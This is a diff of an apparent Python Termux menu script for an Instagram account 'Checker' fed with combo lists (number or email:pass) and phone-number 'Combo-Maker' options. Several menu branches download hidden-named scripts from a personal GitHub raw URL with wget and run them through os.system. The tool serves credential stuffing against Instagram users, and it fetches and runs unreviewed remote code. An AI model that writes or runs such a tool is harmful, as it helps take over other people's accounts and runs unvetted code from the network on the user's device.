@@ -286,10 +286,7 @@ def dwbara():
    '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 '''+wd+'''
     |'''+W+''' 1 '''+wd+'''| '''+W+'''= '''+wd+'''Checker('''+R+'''instgram'''+wd+''')-('''+G+'''Combo'''+wd+'''='''+Y+'''Number or email:pass'''+wd+''')
-    |'''+W+''' 2 '''+wd+'''| '''+W+'''= '''+wd+'''Combo-Maker-('''+Y+'''07*********:*******'''+wd+''')
-    |'''+W+''' 3 '''+wd+'''| '''+W+'''= '''+wd+'''Combo-Maker-('''+Y+'''07*********:07*********'''+wd+''')
-    |'''+W+''' 4 '''+wd+'''| '''+W+'''= '''+wd+'''Combo-Maker-('''+Y+'''07*********:random!!'''+wd+''')
-
+    |'''+W+''' 2 '''+wd+'''| '''+W+'''= '''+wd+'''Checker('''+R+'''instgram'''+wd+''')-('''+G+'''Combo'''+wd+'''='''+Y+'''Number'''+wd+'''-'''+G+'''Random'''+wd+''')
     | '''+W+'''0 '''+wd+'''| '''+W+'''= '''+wd+'''Exit'''+W+'''()'''+wd+'''
                        '''+Y+'''Allow '''+wd+'''['''+W+''' termux-setup-storage'''+wd+''' ]
    '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -300,16 +297,8 @@ def dwbara():
         instagram1()
     elif ia=="2":
         import wget, os
-        wget.download("https://raw.githubusercontent.com/sfrsfrsfr404sfrsfrsfr/-/main/.2.py")
-        os.system("python .2.py")
-    elif ia=="3":
-        import wget, os
         wget.download("https://raw.githubusercontent.com/sfrsfrsfr404sfrsfrsfr/3/main/.3.py")
         os.system("python .3.py")
-    elif ia=="4":
-        import wget, os
-        wget.download("https://raw.githubusercontent.com/sfrsfrsfr404sfrsfrsfr/4/main/.4.py")
-        os.system("python .4.py")
     elif ia=="0":
         print(" Exit !")
         os.sys.exit()
